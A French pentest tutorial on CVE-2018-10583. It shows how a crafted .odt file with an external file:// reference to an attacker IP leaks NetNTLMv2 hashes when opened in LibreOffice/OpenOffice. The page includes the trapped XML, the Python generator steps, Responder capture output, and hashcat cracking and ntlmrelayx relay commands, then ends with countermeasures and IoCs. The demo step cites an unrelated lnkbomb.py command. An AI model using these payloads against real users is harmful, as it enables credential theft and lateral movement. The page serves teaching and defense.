# Malicious ODF File

{% embed url="https://github.com/lof1sec/Bad-ODF" %}

## <mark style="color:red;">Exploit LibreOffice / OpenOffice – “Malicious ODF File Creator”</mark>

### <mark style="color:blue;">🧩 1. Introduction</mark>

**Nom** : LibreOffice/OpenOffice `.odt` Information Disclosure\
**CVE** : CVE-2018-10583\
**Découvert par** : Richard Davy (@rd\_pentest)\
**Langage PoC** : Python 3\
**Impact** : Fuite d’empreintes NetNTLMv2 (hashs NTLM) via ressource externe\
**Outils requis** :

* `python3`, `pip`, `ezodf`, `lxml`
* Un serveur SMB captureur (e.g. **Responder**, **Inveigh**, **smbserver.py**)
* LibreOffice ou OpenOffice vulnérable (v6.0.3 / 4.1.5)

***

### <mark style="color:blue;">⚙️ 2. Vulnérabilité et principe d’exploitation</mark>

LibreOffice/OpenOffice interprète certains champs XML (`content.xml`) dans les documents `.odt` (Open Document Text).\
Ces champs peuvent **référencer des objets distants** via `file://`, `http://` ou `\\UNC\path`.

#### <mark style="color:green;">➤ Comportement vulnérable</mark>

Lors de l’ouverture du fichier, l’application tente de **charger l’objet externe**, même sans macro, donc :

```xml
<draw:frame draw:style-name="fr1" draw:name="Object1" text:anchor-type="paragraph">
    <draw:object xlink:href="file://ATTACKER_IP/test.jpg" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/>
</draw:frame>
```

Ce champ déclenche une **requête SMB** ou **HTTP** vers le serveur distant, incluant les **identifiants NetNTLMv2** de l’utilisateur Windows courant.

C’est une **fuite passive d’informations** (Information Disclosure).

***

### <mark style="color:blue;">💣 3. Objectif de l’exploit</mark>

L’objectif est de créer **un document ODF (.odt)** piégé :

* Lorsqu’une victime l’ouvre, LibreOffice va tenter de charger une image externe (`file://attacker_ip/test.jpg`)
* Cela envoie les **hashs NetNTLMv2** de la victime vers le serveur SMB contrôlé par l’attaquant.

Ces hashs peuvent ensuite être :

* **Crackés** avec Hashcat (`-m 5600`)
* Ou **relayés** (via NTLM relay) pour authentification sur un autre service.

***

### <mark style="color:blue;">🔍 4. Analyse du script Python</mark>

#### <mark style="color:green;">📦 Importation & Vérifications</mark>

```python
from ezodf import newdoc
import zipfile, base64, os
```

* `ezodf` permet de générer des documents `.odt` légitimes.
* `zipfile` sert à manipuler les archives ODF (elles sont des ZIP).
* `base64` décode le XML encodé.
* `os` gère la suppression et les fichiers temporaires.

#### <mark style="color:green;">🧱 Étape 1 – Création d’un document vide</mark>

```python
odt = newdoc(doctype='odt', filename='temp.odt')
odt.save()
```

Crée un fichier `.odt` propre (LibreOffice-compatible).

***

#### <mark style="color:green;">🧩 Étape 2 – Insertion du XML piégé</mark>

Le code concatène trois parties :

1. `contentxml1` → première partie du XML encodé base64
2. `contentxml2` → l’adresse IP saisie par l’utilisateur
3. `contentxml3` → fin du XML (également base64)

```python
contentxml2 = input("Please enter IP of listener: ")
fileout = part1 + contentxml2 + part2
```

Cela injecte une balise :

```xml
xlink:href="file://192.168.1.21/test.jpg"
```

***

#### <mark style="color:green;">📁 Étape 3 – Remplacement dans l’archive</mark> <mark style="color:green;"></mark><mark style="color:green;">`.odt`</mark>

Les fichiers `.odt` sont des archives ZIP structurées :

```
content.xml
meta.xml
styles.xml
mimetype
META-INF/
```

Le script :

1. Ouvre le `.odt` original (`temp.odt`)
2. Retire le fichier `content.xml`
3. Ajoute le nouveau `content.xml` modifié

```python
zin = zipfile.ZipFile('temp.odt', 'r')
zout = zipfile.ZipFile('bad.odt', 'w')
# copie tout sauf content.xml
for item in zin.infolist():
    if item.filename != 'content.xml':
        zout.writestr(item, zin.read(item.filename))
zout.close()
```

Puis ajoute le fichier piégé :

```python
zf = zipfile.ZipFile('bad.odt', mode='a')
zf.write('content.xml', arcname='content.xml')
```

***

#### 🧹 Étape 4 – Nettoyage

Supprime les fichiers temporaires :

```python
os.remove("content.xml")
os.remove("temp.odt")
```

***

### <mark style="color:green;">⚔️ 5. Démonstration pratique (en environnement de test)</mark>

#### 🧰 Environnement de labo :

| Poste                          | Rôle                               | IP           |
| ------------------------------ | ---------------------------------- | ------------ |
| Kali Linux                     | Attaquant (Responder SMB Listener) | 192.168.1.21 |
| Windows 10 + LibreOffice 6.0.3 | Cible                              | 192.168.1.79 |

#### <mark style="color:green;">🧱 Étapes</mark>

1.  **Attaquant** : démarre Responder

    ```bash
    sudo responder -I eth0 -v
    ```
2.  **Attaquant** : crée le document

    ```bash
    python3 lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s Shared -u themayor -p Password123! -n dc01 --windows
    ```

    (ou ce script ci si tu veux juste générer `bad.odt`)
3. **Victime** : ouvre `bad.odt`
4.  **Attaquant** : observe la capture :

    ```
    [SMB] NTLMv2-SSP Hash captured from 192.168.1.79
    ```

    Exemple :

    ```
    Administrator::WORKSTATION:1122334455667788:88D6F33DB12A6A93C...:0101000000000000...
    ```

***

### <mark style="color:blue;">🧪 6. Exploitation postérieure</mark>

Les hashs NetNTLMv2 capturés peuvent être :

*   Crackés :

    ```bash
    hashcat -m 5600 hashes.txt rockyou.txt
    ```
*   Relayés :

    ```bash
    ntlmrelayx.py -tf targets.txt -smb2support
    ```

***

### <mark style="color:blue;">🧰 7. Contremesures</mark>

| Niveau      | Action                            | Détails                                                 |
| ----------- | --------------------------------- | ------------------------------------------------------- |
| Application | Mise à jour                       | Versions >= LibreOffice 6.0.6 corrigent le comportement |
| Système     | Désactiver NTLM / SMBv1           | GPO / Registre                                          |
| Réseau      | Bloquer SMB sortant               | Filtrer 445/TCP, 137–139/UDP                            |
| Sécurité    | Désactiver résolution UNC externe | “Don’t send NTLM outside domain”                        |
| Éducation   | Sensibilisation                   | Ne jamais ouvrir de `.odt` non vérifiés                 |

***

### <mark style="color:blue;">🕵️ 8. Détection et analyse forensique</mark>

#### <mark style="color:green;">🧩 Indicateurs de compromission (IoC)</mark>

* Documents `.odt` contenant des balises `xlink:href="file://..."`.
* Connexions SMB sortantes vers IP inconnues.
* Alertes IDS : `SMB NTLM authentication attempt external`.

#### <mark style="color:green;">🔍 Analyse rapide</mark>

Extraction du `content.xml` :

```bash
unzip -p bad.odt content.xml | grep xlink
```

***

### <mark style="color:blue;">🧱 9. Schéma du flux d’attaque</mark>

```
+-------------+         SMB (NTLMv2 hash)          +-----------------+
| Victime     | ---------------------------------> | Attaquant (SMB) |
| LibreOffice |                                     | 192.168.1.21    |
+-------------+                                     +-----------------+
        |                                                      |
        | Ouvre bad.odt                                        |
        | "file://192.168.1.21/test.jpg"                       |
        | -> Auth automatique via NTLM                         |
```

***

### <mark style="color:blue;">🔬 10. Résumé technique pour rapport pentest</mark>

| Élément                  | Détail                                 |
| ------------------------ | -------------------------------------- |
| **Vulnérabilité**        | CVE-2018-10583                         |
| **Composant**            | LibreOffice / OpenOffice               |
| **Type**                 | Information Disclosure (SMB NTLM Leak) |
| **CVSS**                 | 4.3 (Medium)                           |
| **Vecteur**              | Malicious ODF document                 |
| **Impact**               | Exfiltration de hashs NTLM             |
| **Exploitation requise** | Interaction utilisateur                |
| **Contournement**        | Bloquer SMB/NTLM externes              |
| **Correctif**            | Upgrade LibreOffice ≥ 6.0.6            |

***
